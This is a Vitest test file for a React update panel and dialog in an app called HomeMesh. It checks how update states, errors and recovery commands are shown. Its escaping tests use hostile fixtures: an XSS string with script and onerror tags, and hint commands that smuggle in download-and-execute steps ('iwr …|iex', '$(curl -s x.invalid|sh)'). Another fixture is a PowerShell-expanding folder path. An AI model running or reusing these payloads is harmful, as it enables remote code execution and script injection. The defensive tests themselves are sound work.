import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { NodeSummary, UpdateCheckResult } from "../api/types";
import { UpdateDialog, UpdatePanel } from "../components/UpdatePanel";
import { HUB_UPDATE_KEY, readHubUpdate } from "../lib/update";
import { MIN, NOW, SHA_A, SHA_B, build, hubNode, iso, node, report, result, row, stored, storedError } from "./updateFixtures";

/** The words of an element, without the labels of buttons inside it (inline "Copy" buttons). */
function words(el: Element | null | undefined): string {
  if (!el) return "";
  const copy = el.cloneNode(true) as Element;
  copy.querySelectorAll("button").forEach((b) => b.remove());
  return copy.textContent ?? "";
}

function panel(n: NodeSummary, props: Partial<Parameters<typeof UpdatePanel>[0]> = {}) {
  cleanup();
  const handlers = { onCheck: vi.fn(), onUpdate: vi.fn(), onDismiss: vi.fn() };
  const utils = render(<UpdatePanel node={n} now={NOW} {...handlers} {...props} />);
  const box = screen.getByTestId(`update-panel-${n.id}`);
  const state = box.querySelector(".update-state") as HTMLElement;
  return { ...utils, ...handlers, box, state, text: () => words(state) };
}

const cmds = (box: HTMLElement) => [...box.querySelectorAll("pre")].map((p) => p.textContent);
const LINUX_PULL = "cd <HomeMesh source folder> && git pull --ff-only && ./deploy/linux/install.sh --upgrade";
const WINDOWS_PULL = "cd <HomeMesh source folder>; git pull --ff-only; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade";

afterEach(() => {
  vi.unstubAllGlobals();
  window.localStorage.clear();
});

describe("version line", () => {
  it("shows version, short commit and date", () => {
    const { box } = panel(node());
    expect(box.querySelector(".update-version")?.textContent).toBe("0.3.0 · a38a3fa · 13 Oct");
  });
  it("never invents a commit", () => {
    const { box } = panel(node({ build: build({ commit: null, commit_date: null, source: "dev", can_update: false, reason: "editable/development install; update it with git pull" }) }));
    expect(box.querySelector(".update-version")?.textContent).toBe("0.3.0 · development install");
  });
});

describe("card states (spec 14 table)", () => {
  it("build null: no updater, OS command from the node's os field", () => {
    const linux = panel(node({ build: null }));
    expect(linux.text()).toBe("This version has no updater. Update it by hand once:");
    expect(cmds(linux.box)).toEqual([LINUX_PULL]);
    expect(within(linux.box).getByRole("button", { name: "Copy" })).toBeInTheDocument();
    linux.unmount();
    const win = panel(node({ os: "Windows", build: null }));
    expect(cmds(win.box)).toEqual([WINDOWS_PULL]);
    expect(within(win.box).queryByRole("button", { name: /Check/ })).toBeNull();
  });

  it("update_not_allowed: the allow command, Check stays enabled", () => {
    const p = panel(node({ update_check: storedError("update_not_allowed", "Remote updates are off on gaming-pc.", "On gaming-pc, run `homemesh update allow`.") }));
    expect(p.text()).toBe("Remote updates are off on this computer. On it, run:");
    expect(cmds(p.box)).toEqual(["homemesh update allow"]);
    const check = within(p.box).getByRole("button", { name: "Check again" });
    expect(check).toBeEnabled();
    fireEvent.click(check);
    expect(p.onCheck).toHaveBeenCalledOnce();
  });

  it("the hello's consent flag gives the same hint before any check", () => {
    const p = panel(node({ build: build({ update_allowed: false }) }));
    expect(p.text()).toBe("Remote updates are off on this computer. On it, run:");
  });

  it("other check problems: the message and hint for the code", () => {
    const p = panel(node({ update_check: storedError("update_dirty_checkout", "/home/ann/src/HomeMesh has local changes: README.md.",
      "Commit or discard them (`git -C /home/ann/src/HomeMesh status`), then check again.") }));
    expect(p.text()).toBe("/home/ann/src/HomeMesh has local changes: README.md. Commit or discard them (git -C /home/ann/src/HomeMesh status), then check again.");
    expect(p.state.querySelector("code")?.textContent).toBe("git -C /home/ann/src/HomeMesh status");
    expect(within(p.box).getByText(/Checked 5 min ago/)).toBeInTheDocument();
  });

  it("update_needs_installer / update_not_supported: the installer command with Copy", () => {
    const p = panel(node({ update_check: storedError("update_needs_installer", "This update needs the installer to run once by hand.", "cd /home/ann/src/HomeMesh && git pull --ff-only && ./deploy/linux/install.sh --upgrade") }));
    expect(p.text()).toBe("This update needs the installer to run once by hand. Update it by hand once:");
    expect(cmds(p.box)).toEqual(["cd /home/ann/src/HomeMesh && git pull --ff-only && ./deploy/linux/install.sh --upgrade"]);
  });

  it("update_not_supported: the installer command, except for a development install", () => {
    const msg = "gaming-pc can't be updated remotely: /opt/hm is not a git checkout.";
    const p = panel(node({ build: build({ can_update: false, source: "unknown" }), update_check: storedError("update_not_supported", msg, "Update it by hand once: …") }));
    expect(p.text()).toBe(`${msg} Update it by hand once:`);
    expect(cmds(p.box)).toEqual(["cd /home/ann/src/HomeMesh && git pull --ff-only && ./deploy/linux/install.sh --upgrade"]);
    const devMsg = "gaming-pc can't be updated remotely: editable/development install; update it with git pull.";
    const dev = panel(node({ build: build({ can_update: false, source: "dev", commit: null }), update_check: storedError("update_not_supported", devMsg, "Update it by hand once: …") }));
    expect(dev.text()).toBe(devMsg);
    expect(cmds(dev.box)).toEqual([]);
  });

  it("labels the card's button Check until something was checked", () => {
    expect(within(panel(node()).box).getByRole("button", { name: "Check" })).toBeEnabled();
    expect(within(panel(node({ update_check: stored(result()) })).box).getByRole("button", { name: "Check again" })).toBeEnabled();
  });

  it("up to date", () => {
    const p = panel(node({ update_check: stored(result({ behind: 0, commits: [], can_update: false }), 2 * 60 * MIN) }));
    expect(p.text()).toBe("✓ Up to date · checked 2 h ago");
    expect(within(p.box).queryByRole("button", { name: "Update…" })).toBeNull();
  });

  it("behind: count, age and Update…", () => {
    const p = panel(node({ update_check: stored(result()) }));
    expect(p.text()).toBe("3 new changes · checked 5 min ago");
    fireEvent.click(within(p.box).getByRole("button", { name: "Update…" }));
    expect(p.onUpdate).toHaveBeenCalledOnce();
  });

  it("behind with a blocking problem: no Update, the problem instead", () => {
    const p = panel(node({ update_check: stored(result({ can_update: false, problems: [
      { code: "update_diverged", message: "/home/ann/src/HomeMesh has commits that aren't on origin/main; no fast-forward possible.", hint: "`git -C /home/ann/src/HomeMesh log origin/main..HEAD`; push or reset them.", blocking: true },
      { code: "no_linger", message: "Logging out of gaming-pc stops HomeMesh and a running update.", hint: "To keep them running, run `loginctl enable-linger $USER` on it once.", blocking: false },
    ] })) }));
    expect(p.text()).toBe("3 new changes · checked 5 min ago");
    expect(within(p.box).queryByRole("button", { name: "Update…" })).toBeNull();
    expect(p.box.querySelector('[data-code="update_diverged"]')?.textContent).toContain("no fast-forward possible");
    expect(p.box.querySelector('[data-code="no_linger"]')?.textContent).toContain("loginctl enable-linger $USER");
  });

  it("offline: Update disabled", () => {
    const p = panel(node({ online: false, update_check: stored(result()) }));
    expect(p.text()).toBe("Offline. Update it when it's back on.");
    expect(within(p.box).getByRole("button", { name: "Update…" })).toBeDisabled();
    expect(within(p.box).getByRole("button", { name: "Check again" })).toBeDisabled();
  });

  it("another computer updating: Update disabled with the reason", () => {
    const p = panel(node({ update_check: stored(result()) }), { busyElsewhere: "hub-pc" });
    expect(within(p.box).getByRole("button", { name: "Update…" })).toBeDisabled();
    expect(within(p.box).getByText("Another computer is updating")).toBeInTheDocument();
  });

  it("requested / prechecks / building: getting ready", () => {
    for (const r of [row({ state: "requested", phase: null, run_id: null, last_report_at: null }), row({ phase: "prechecks" }), row({ phase: "building" }), row({ phase: "accepted" })]) {
      const p = panel(node({ update: r }));
      expect(p.text()).toBe("Getting ready on gaming-pc…");
      expect(within(p.box).queryByRole("button")).toBeNull(); // no Check while it runs
      p.unmount();
    }
  });

  it("draining", () => {
    expect(panel(node({ update: row({ phase: "draining" }) })).text()).toBe("Waiting for running jobs on gaming-pc…");
  });

  it("stopping…verifying: restarting with the time since the run started, no estimate", () => {
    for (const phase of ["stopping", "switching", "starting", "verifying"]) {
      const p = panel(node({ online: phase === "stopping", update: row({ phase }), update_live: report({ phase }) }));
      expect(p.text()).toBe("gaming-pc is restarting · 3:12 elapsed");
      p.unmount();
    }
    expect(panel(node({ update: row({ phase: "rolling_back" }), update_live: report({ phase: "rolling_back" }) })).text())
      .toBe("gaming-pc is restarting (undoing the update) · 3:12 elapsed");
  });

  it("restarting while offline without a live report counts from the request", () => {
    const p = panel(node({ online: false, update: row({ phase: "starting", requested_at: iso(4 * MIN), last_report_at: iso(2 * MIN) }) }));
    expect(p.text()).toBe("gaming-pc is restarting · 4:00 elapsed");
  });

  it("keeps counting from the run's start when the restarting computer drops offline", () => {
    const handlers = { onCheck: vi.fn(), onUpdate: vi.fn(), onDismiss: vi.fn() };
    const online = node({ update: row({ phase: "stopping" }), update_live: report({ phase: "stopping" }) });
    const { rerender } = render(<UpdatePanel node={online} now={NOW} {...handlers} />);
    const state = () => screen.getByTestId("update-panel-n-worker").querySelector(".update-state")?.textContent;
    expect(state()).toBe("gaming-pc is restarting · 3:12 elapsed");
    // Offline the hub has no live report; the row's requested_at is 5 minutes ago.
    rerender(<UpdatePanel node={{ ...online, online: false, update_live: null, update: row({ phase: "switching" }) }} now={NOW + 1000} {...handlers} />);
    expect(state()).toBe("gaming-pc is restarting · 3:13 elapsed");
  });

  it("the elapsed time keeps counting", () => {
    vi.useFakeTimers({ now: NOW });
    try {
      const n = node({ update: row({ phase: "verifying" }), update_live: report({ phase: "verifying" }) });
      render(<UpdatePanel node={n} onCheck={vi.fn()} onUpdate={vi.fn()} onDismiss={vi.fn()} />);
      const box = screen.getByTestId("update-panel-n-worker");
      expect(box.querySelector(".update-state")?.textContent).toBe("gaming-pc is restarting · 3:12 elapsed");
      act(() => vi.advanceTimersByTime(5000));
      expect(box.querySelector(".update-state")?.textContent).toBe("gaming-pc is restarting · 3:17 elapsed");
    } finally {
      vi.useRealTimers();
    }
  });

  it("an unknown phase is shown as its word", () => {
    expect(panel(node({ update: row({ phase: "teleporting" }) })).text()).toBe("Updating gaming-pc: teleporting…");
    expect(panel(node({ update: row({ phase: "constructor" }) })).text()).toBe("Updating gaming-pc: constructor…");
  });

  it("no word for 10 minutes while offline; Dismiss after 15", () => {
    const early = panel(node({ online: false, update: row({ phase: "verifying", last_report_at: iso(11 * MIN) }) }));
    expect(early.text()).toBe("No word from gaming-pc for 11 min. It may still be working. On it, run:");
    expect(cmds(early.box)).toEqual(["homemesh update status"]);
    expect(within(early.box).queryByRole("button", { name: "Dismiss" })).toBeNull();
    early.unmount();
    const late = panel(node({ online: false, update: row({ phase: "verifying", last_report_at: iso(16 * MIN) }) }));
    expect(late.text()).toBe("No word from gaming-pc for 16 min. It may still be working. On it, run:");
    fireEvent.click(within(late.box).getByRole("button", { name: "Dismiss" }));
    expect(late.onDismiss).toHaveBeenCalledOnce();
  });

  it("a connected computer reporting this run is never 'no word', however long a phase takes", () => {
    expect(panel(node({ update: row({ phase: "building", last_report_at: iso(25 * MIN) }), update_live: report({ phase: "building" }) })).text())
      .toBe("Getting ready on gaming-pc…");
  });

  it("a connected computer that doesn't report this run gets 'no word' and Dismiss, as the hub allows", () => {
    // E.g. a local `homemesh update` started right after the remote run ended, before its final report reached the hub.
    const p = panel(node({ update: row({ phase: "building", last_report_at: iso(16 * MIN) }),
      update_live: report({ job_id: null, origin: "local", run_id: "u20261016115900-0a1b2c3e", status: "ok", phase: "cleanup" }) }));
    expect(p.text()).toBe("No word from gaming-pc for 16 min. It may still be working. On it, run:");
    fireEvent.click(within(p.box).getByRole("button", { name: "Dismiss" }));
    expect(p.onDismiss).toHaveBeenCalledOnce();
  });

  it("ok / ok_unconfirmed", () => {
    expect(panel(node({ update: row({ state: "ok", finished_at: iso(MIN) }) })).text()).toBe("Updated to b12c3d4");
    const u = panel(node({ update: row({ state: "ok_unconfirmed", finished_at: iso(MIN), warnings: [
      { code: "not_confirmed", message: "The new version runs, but the hub couldn't be reached to confirm it.", hint: "It shows up when gaming-pc reconnects." }] }) }));
    expect(u.text()).toBe("Updated to b12c3d4 (the hub couldn't confirm it at the time)");
    expect(u.box.querySelector('[data-code="not_confirmed"]')?.textContent).toContain("couldn't be reached");
  });

  it("already up to date", () => {
    expect(panel(node({ update: row({ state: "already_up_to_date", finished_at: iso(MIN) }) })).text()).toBe("Already up to date");
  });

  it("rolled_back", () => {
    const p = panel(node({ update: row({ state: "rolled_back", finished_at: iso(MIN), error: {
      code: "update_new_version_crashed", message: "The new version stopped right after starting (exit status 1).", hint: "It was undone. See /logs/update-u1.log and homemesh.log." } }) }));
    expect(p.text()).toBe("Update failed and was undone, still on a38a3fa: The new version stopped right after starting (exit status 1). It was undone. See /logs/update-u1.log and homemesh.log.");
  });

  it("failed", () => {
    const p = panel(node({ update: row({ state: "failed", finished_at: iso(MIN), error: {
      code: "update_jobs_running", message: "1 job(s) still ran after 2 minutes (chat); nothing was changed.", hint: 'Try later, or choose "Update anyway" (they will be stopped).' } }) }));
    expect(p.text()).toBe('Update failed: 1 job(s) still ran after 2 minutes (chat); nothing was changed. Try later, or choose "Update anyway" (they will be stopped).');
  });

  it("update_rollback_failed adds the recovery installer command", () => {
    const p = panel(node({ online: false, update: row({ state: "failed", finished_at: iso(MIN), error: {
      code: "update_rollback_failed", message: "The update failed and the previous version did not start either. HomeMesh is stopped on gaming-pc.", hint: "Run the installer." } }) }));
    expect(p.text()).toContain("HomeMesh is stopped on gaming-pc.");
    expect(cmds(p.box)).toEqual(["/home/ann/src/HomeMesh/deploy/linux/install.sh --upgrade"]);
  });

  it("interrupted: phase words and the commit that runs now", () => {
    const err = { code: "update_interrupted", message: "The update was interrupted while switching versions (shutdown, logoff or the helper was stopped).", hint: "gaming-pc now runs an unknown version. Check for updates again." };
    const known = panel(node({ update: row({ state: "interrupted", phase: "building", finished_at: iso(MIN), installed_commit: SHA_A, error: err }) }));
    expect(known.text()).toBe("Interrupted while building the new version; now running a38a3fa. Check again.");
    expect(within(known.box).getByRole("button", { name: "Check again" })).toBeEnabled();
    known.unmount();
    const live = panel(node({ update: row({ state: "interrupted", phase: "switching", finished_at: iso(MIN), error: err }),
      update_live: report({ status: "interrupted", phase: "switching", installed_commit: SHA_B }) }));
    expect(live.text()).toBe("Interrupted while switching versions; now running b12c3d4. Check again.");
    live.unmount();
    const unknown = panel(node({ update: row({ state: "interrupted", phase: "switching", finished_at: iso(MIN), error: err }) }));
    expect(unknown.text()).toBe(`Interrupted while switching versions. ${err.message} ${err.hint}`);
    unknown.unmount();
    const newer = panel(node({ update: row({ state: "interrupted", phase: "warping", finished_at: iso(MIN), installed_commit: SHA_A, error: err }) }));
    expect(newer.text()).toBe("Interrupted while warping; now running a38a3fa. Check again.");
  });

  it("not_started / abandoned with the hint", () => {
    const ns = panel(node({ update: row({ state: "not_started", finished_at: iso(MIN), error: { code: "update_not_started", message: "The update did not start on gaming-pc.", hint: "On gaming-pc, run `homemesh update status` to see why." } }) }));
    expect(ns.text()).toBe("The update did not start. On gaming-pc, run homemesh update status to see why.");
    expect(within(ns.box).getByRole("button", { name: "Copy" })).toBeInTheDocument(); // the command in the hint
    ns.unmount();
    const ab = panel(node({ update: row({ state: "abandoned", finished_at: iso(MIN), log: "/logs/update-u20261016115500-0a1b2c3d.log", error: { code: "update_abandoned", message: "Outcome unknown: gaming-pc stopped reporting on this update.", hint: "On gaming-pc, run `homemesh update status`; check for updates again when it is back." } }) }));
    expect(ab.text()).toBe("Outcome unknown. On gaming-pc, run homemesh update status; check for updates again when it is back.");
    expect(ab.box.textContent).toContain("Log on gaming-pc: /logs/update-u20261016115500-0a1b2c3d.log");
  });

  it("an abandoned update becomes active again when it reports", () => {
    const abandoned = node({ online: false, update: row({ state: "abandoned", finished_at: iso(MIN), error: { code: "update_abandoned", message: "m", hint: "h" } }) });
    const handlers = { onCheck: vi.fn(), onUpdate: vi.fn(), onDismiss: vi.fn() };
    const { rerender } = render(<UpdatePanel node={abandoned} now={NOW} {...handlers} />);
    const state = () => words(screen.getByTestId("update-panel-n-worker").querySelector(".update-state"));
    expect(state()).toBe("Outcome unknown. h");
    rerender(<UpdatePanel node={{ ...abandoned, online: true, update: row({ state: "running", phase: "verifying" }), update_live: report({ phase: "verifying" }) }} now={NOW} {...handlers} />);
    expect(state()).toBe("gaming-pc is restarting · 3:12 elapsed");
  });

  it("protocol_incompatible: different version, OS command", () => {
    const p = panel(node({ online: false, last_disconnect_reason: "protocol_incompatible: worker supports [2], hub supports [1]" }));
    expect(p.text()).toBe("Can't connect: different HomeMesh version. Update it by hand:");
    expect(cmds(p.box)).toEqual(["cd /home/ann/src/HomeMesh && git pull --ff-only && ./deploy/linux/install.sh --upgrade"]);
  });

  it("update_check_pending (and a click on its way) show Checking…", () => {
    expect(panel(node({ update_check_pending: "job-check-2", update_check: stored(result()) })).text()).toBe("Checking for updates…");
    expect(panel(node(), { checking: true }).text()).toBe("Checking for updates…");
  });

  it("a computer that can't update says why; a dev install gets no installer command", () => {
    const p = panel(node({ build: build({ can_update: false, source: "unknown", cannot_update_reason: "/opt/hm is not a git checkout" }) }));
    expect(p.text()).toBe("Can't be updated remotely: /opt/hm is not a git checkout. Update it by hand once:");
    expect(cmds(p.box)).toEqual(["cd /home/ann/src/HomeMesh && git pull --ff-only && ./deploy/linux/install.sh --upgrade"]);
    p.unmount();
    const dev = panel(node({ build: build({ can_update: false, source: "dev", commit: null, reason: "editable/development install; update it with git pull" }) }));
    expect(dev.text()).toBe("Can't be updated remotely: editable/development install; update it with git pull.");
    expect(cmds(dev.box)).toEqual([]);
  });

  it("shows a failed request", () => {
    const p = panel(node(), { requestError: { message: "Another computer (hub-pc) is updating.", hint: "Wait for it to finish." } });
    expect(within(p.box).getByRole("alert").textContent).toContain("Another computer (hub-pc) is updating.");
  });
});

describe("no text is rendered as HTML", () => {
  const evil = `<img src=x onerror="window.__pwned=1"><b>bold</b><script>window.__pwned=1</script>`;

  it("in messages, hints, warnings, subjects, names and paths", () => {
    const n = node({
      name: `pc<i>x</i>`,
      update: row({ state: "failed", finished_at: iso(MIN), log: evil, error: { code: "update_fetch_failed", message: `Could not fetch: ${evil}`, hint: `\`${evil}\`` },
        warnings: [{ code: "x", message: evil, hint: evil }] }),
    });
    const { container } = render(<UpdatePanel node={n} now={NOW} onCheck={vi.fn()} onUpdate={vi.fn()} onDismiss={vi.fn()} />);
    expect(container.querySelector("img, b, i, script")).toBeNull();
    expect(container.textContent).toContain("<img src=x");
    expect(container.textContent).toContain("<b>bold</b>");
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("offers Copy only for commands in hints: messages carry tool output", () => {
    // update_install_failed's message holds pip's last lines; a package can print anything, backticks included.
    const n = node({ update: row({ state: "failed", finished_at: iso(MIN), error: { code: "update_install_failed",
      message: "Installing the new version failed: ERROR: run `git config --global core.sshCommand 'sh -c evil'` first.",
      hint: "Nothing was changed. pip needs PyPI; check the network. See `homemesh update status`." } }) });
    const { box } = panel(n);
    expect([...box.querySelectorAll("code")].map((c) => c.textContent)).toEqual([
      "git config --global core.sshCommand 'sh -c evil'", "homemesh update status"]);
    const copies = within(box).getAllByRole("button", { name: "Copy" });
    expect(copies).toHaveLength(1);
    expect(copies[0].previousElementSibling?.textContent).toBe("homemesh update status");
  });

  it("offers no Copy for a hint command that would run more than it starts with", () => {
    // JobFailed.hint and run.json come from the computer itself: one impersonated with stolen credentials can
    // send anything, and the owner then runs it on the real computer.
    const c = panel(node({ update_check: storedError("update_auth_failed", "Signing in to the git server failed or is needed.",
      "On gaming-pc run `homemesh update allow; iwr http://x.invalid/a|iex` once.") }));
    expect(c.box.querySelector("code")?.textContent).toBe("homemesh update allow; iwr http://x.invalid/a|iex");
    expect(within(c.box).queryByRole("button", { name: "Copy" })).toBeNull();
    c.unmount();
    const f = panel(node({ update: row({ state: "failed", finished_at: iso(MIN), error: { code: "update_auth_failed",
      message: "Signing in to the git server failed or is needed.", hint: "On gaming-pc run `git -C $(curl -s x.invalid|sh) fetch` once." } }) }));
    expect(f.box.querySelector("code")?.textContent).toBe("git -C $(curl -s x.invalid|sh) fetch");
    expect(within(f.box).queryByRole("button", { name: "Copy" })).toBeNull();
  });

  it("offers no Copy for a command with hidden or bidirectional characters", () => {
    for (const ch of ["‮", "⁦", "​", "­", "﻿", "\u001b"]) {
      const p = panel(node({ update: row({ state: "not_started", finished_at: iso(MIN), error: { code: "update_not_started",
        message: "The update did not start on gaming-pc.", hint: `On gaming-pc, run \`homemesh update status${ch}\` to see why.` } }) }));
      expect(p.box.querySelector("code")).not.toBeNull();
      expect(within(p.box).queryByRole("button", { name: "Copy" })).toBeNull();
      p.unmount();
    }
  });

  it("builds no pasteable command from a folder PowerShell would expand", () => {
    const evilDir = "C:\\Users\\$(iwr http://x.invalid|iex)\\HomeMesh";
    const hub = hubNode({ build: build({ os: "windows", source_dir: evilDir, logs_dir: "C:\\logs" }), update_check: stored(result()) });
    render(<UpdateDialog node={hub} result={result()} hub={hub} onClose={vi.fn()} onDone={vi.fn()} />);
    expect(cmds(screen.getByRole("dialog"))).toEqual([
      "homemesh update status", "cd <HomeMesh source folder>; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade"]);
    const p = panel(hubNode({ build: build({ os: "windows", source_dir: evilDir, can_update: false, source: "unknown", cannot_update_reason: "no checkout" }) }));
    expect(cmds(p.box)).toEqual([WINDOWS_PULL]);
    const failed = panel(hubNode({ build: build({ os: "windows", source_dir: evilDir }), update: row({ state: "failed", finished_at: iso(MIN),
      error: { code: "update_rollback_failed", message: "HomeMesh is stopped on hub-pc.", hint: "Run the installer." } }) }));
    expect(cmds(failed.box)).toEqual(["cd <HomeMesh source folder>; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade"]);
  });

  it("in the dialog's commit subjects", () => {
    const r = result({ commits: [{ sha: SHA_B, subject: evil, date: null }], behind: 1 });
    const { container } = render(<UpdateDialog node={node({ update_check: stored(r) })} result={r} hub={null} onClose={vi.fn()} onDone={vi.fn()} />);
    expect(document.body.querySelector(".modal img, .modal b, .modal script")).toBeNull();
    expect(document.body.textContent).toContain("<b>bold</b>");
    expect(container).toBeDefined();
  });
});

// ---------------------------------------------------------------- dialogs

function jsonResponse(status: number, body: unknown) {
  return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
}

describe("worker confirm dialog", () => {
  const many: UpdateCheckResult = result({
    behind: 14,
    commits: Array.from({ length: 12 }, (_, i) => ({ sha: (i.toString(16) + "f".repeat(39)).slice(0, 40), subject: `Change number ${i + 1}`, date: null })),
  });

  it("lists the first 10 subjects, the full sha, the restart note; force goes in the body", async () => {
    const fetchMock = vi.fn(async () => jsonResponse(202, { update_id: "job-apply-9", state: "requested" }));
    vi.stubGlobal("fetch", fetchMock);
    const onDone = vi.fn();
    render(<UpdateDialog node={node({ update_check: stored(many) })} result={many} hub={hubNode({ build: build({ commit: SHA_B }) })} onClose={vi.fn()} onDone={onDone} />);
    const dialog = screen.getByRole("dialog", { name: "Update gaming-pc" });
    const items = within(dialog).getAllByRole("listitem");
    expect(items).toHaveLength(10);
    expect(items[0].textContent).toContain("Change number 1");
    expect(items[9].textContent).toContain("Change number 10");
    expect(within(dialog).queryByText("Change number 11")).toBeNull();
    expect(within(dialog).getByText("and 4 more")).toBeInTheDocument();
    expect(within(dialog).getByTestId("update-target").textContent).toBe(SHA_B);
    expect(within(dialog).getByText("HomeMesh on gaming-pc restarts; running jobs there finish first (up to 2 minutes).")).toBeInTheDocument();
    expect(within(dialog).queryByText(/database will be upgraded/)).toBeNull();
    expect(within(dialog).queryByTestId("version-mismatch")).toBeNull();
    expect(within(dialog).queryByTestId("hub-restart-warning")).toBeNull();

    fireEvent.click(within(dialog).getByRole("checkbox", { name: "Update anyway (stop running jobs)" }));
    fireEvent.click(within(dialog).getByRole("button", { name: "Update" }));
    await waitFor(() => expect(onDone).toHaveBeenCalledOnce());
    const [url, init] = fetchMock.mock.calls[0] as unknown as [string, RequestInit];
    expect(url).toBe("/api/v1/nodes/n-worker/update/apply");
    expect(init.method).toBe("POST");
    expect(JSON.parse(init.body as string)).toEqual({ expected_commit: SHA_B, force: true });
    expect(window.localStorage.getItem(HUB_UPDATE_KEY)).toBeNull(); // only the hub saves recovery help
  });

  it("says when the database will be upgraded", () => {
    const r = result({ migrations: true });
    render(<UpdateDialog node={node({ update_check: stored(r) })} result={r} hub={null} onClose={vi.fn()} onDone={vi.fn()} />);
    expect(screen.getByText("The database will be upgraded (a copy is kept).")).toBeInTheDocument();
  });

  it("warns when the worker would run a version the hub doesn't, with Update anyway", () => {
    const r = result();
    render(<UpdateDialog node={node({ update_check: stored(r) })} result={r} hub={hubNode()} onClose={vi.fn()} onDone={vi.fn()} />);
    expect(screen.getByTestId("version-mismatch").textContent)
      .toBe("This puts gaming-pc on a version the hub doesn't run yet (hub: a38a3fa). Update the hub first.");
    expect(screen.getByRole("button", { name: "Update anyway" })).toBeEnabled();
    expect(screen.queryByRole("button", { name: "Update" })).toBeNull();
  });

  it("shows a refusal from the hub and stays open", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => jsonResponse(409, { error: { code: "update_busy", message: "Another computer (hub-pc) is updating.", hint: "Wait for it to finish; on hub-pc: `homemesh update status`." } })));
    const onDone = vi.fn();
    const r = result();
    render(<UpdateDialog node={node({ update_check: stored(r) })} result={r} hub={null} onClose={vi.fn()} onDone={onDone} />);
    fireEvent.click(screen.getByRole("button", { name: "Update" }));
    expect(await screen.findByRole("alert")).toHaveTextContent("Another computer (hub-pc) is updating.");
    expect(onDone).not.toHaveBeenCalled();
  });
});

describe("hub confirm dialog", () => {
  beforeEach(() => window.localStorage.clear());

  it("warns about the restart and shows the recovery block built from build", () => {
    const hub = hubNode({ update_check: stored(result({ migrations: true })) });
    render(<UpdateDialog node={hub} result={result({ migrations: true })} hub={hub} onClose={vi.fn()} onDone={vi.fn()} />);
    const dialog = screen.getByRole("dialog", { name: "Update the hub (hub-pc)" });
    expect(within(dialog).getByTestId("hub-restart-warning").textContent)
      .toBe("The hub restarts. All computers disconnect briefly, chats in progress on any computer stop, and this page is offline until the hub is back.");
    expect(within(dialog).queryByTestId("version-mismatch")).toBeNull();
    expect(within(dialog).getByText("The database will be upgraded (a copy is kept).")).toBeInTheDocument();
    expect(cmds(dialog)).toEqual([
      "homemesh update status",
      'cd "C:\\Users\\Ann\\src\\HomeMesh"; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade',
    ]);
    expect(dialog.textContent).toContain("On hub-pc, run:");
    expect(dialog.textContent).toContain("If that fails, open the newest update-u*.log in C:\\Users\\Ann\\AppData\\Local\\HomeMesh\\logs and run the installer:");
    expect(within(dialog).getAllByRole("button", { name: "Copy" })).toHaveLength(2);
  });

  it("saves the recovery record before sending, then adds the update id", async () => {
    let storedAtSend: string | null = null;
    vi.stubGlobal("fetch", vi.fn(async () => {
      storedAtSend = window.localStorage.getItem(HUB_UPDATE_KEY);
      return jsonResponse(202, { update_id: "job-apply-7", state: "requested" });
    }));
    const onHubRecord = vi.fn();
    const hub = hubNode({ update_check: stored(result()) });
    render(<UpdateDialog node={hub} result={result()} hub={hub} onClose={vi.fn()} onDone={vi.fn()} onHubRecord={onHubRecord} />);
    fireEvent.click(screen.getByRole("button", { name: "Update" }));
    await waitFor(() => expect(onHubRecord).toHaveBeenCalledTimes(2));
    expect(JSON.parse(storedAtSend!)).toMatchObject({ node_id: "n-hub", update_id: null, expected_commit: SHA_B, os: "windows",
      source_dir: "C:\\Users\\Ann\\src\\HomeMesh", logs_dir: "C:\\Users\\Ann\\AppData\\Local\\HomeMesh\\logs" });
    expect(readHubUpdate()).toMatchObject({ update_id: "job-apply-7" });
  });

  it("drops the record when the hub refuses", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => jsonResponse(409, { error: { code: "update_check_required", message: "Check for updates on hub-pc first.", hint: 'Click "Check for updates".' } })));
    const hub = hubNode({ update_check: stored(result()) });
    render(<UpdateDialog node={hub} result={result()} hub={hub} onClose={vi.fn()} onDone={vi.fn()} />);
    fireEvent.click(screen.getByRole("button", { name: "Update" }));
    expect(await screen.findByRole("alert")).toHaveTextContent("Check for updates on hub-pc first.");
    expect(window.localStorage.getItem(HUB_UPDATE_KEY)).toBeNull();
  });

  it("keeps the record of a lost answer when a retry is refused (that update may be running)", async () => {
    let calls = 0;
    vi.stubGlobal("fetch", vi.fn(async () => {
      calls += 1;
      if (calls === 1) throw new TypeError("Failed to fetch"); // the hub took it, the answer got lost
      return jsonResponse(409, { error: { code: "update_busy", message: "Another update or check is running on hub-pc (starting the update).", hint: "Wait for it to finish." } });
    }));
    const onHubRecord = vi.fn();
    const hub = hubNode({ update_check: stored(result()) });
    render(<UpdateDialog node={hub} result={result()} hub={hub} onClose={vi.fn()} onDone={vi.fn()} onHubRecord={onHubRecord} />);
    fireEvent.click(screen.getByRole("button", { name: "Update" }));
    expect(await screen.findByRole("alert")).toHaveTextContent("Cannot reach the HomeMesh coordinator");
    fireEvent.click(screen.getByRole("button", { name: "Update" }));
    expect(await screen.findByText(/Another update or check is running on hub-pc/)).toBeInTheDocument();
    expect(readHubUpdate()).toMatchObject({ node_id: "n-hub", update_id: null, expected_commit: SHA_B });
    expect(onHubRecord).toHaveBeenLastCalledWith(expect.objectContaining({ node_id: "n-hub" }));
  });

  it("keeps the record when the answer is lost", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => { throw new TypeError("Failed to fetch"); }));
    const hub = hubNode({ update_check: stored(result()) });
    render(<UpdateDialog node={hub} result={result()} hub={hub} onClose={vi.fn()} onDone={vi.fn()} />);
    fireEvent.click(screen.getByRole("button", { name: "Update" }));
    expect(await screen.findByRole("alert")).toHaveTextContent("Cannot reach the HomeMesh coordinator");
    expect(readHubUpdate()).toMatchObject({ update_id: null, expected_commit: SHA_B });
  });
});
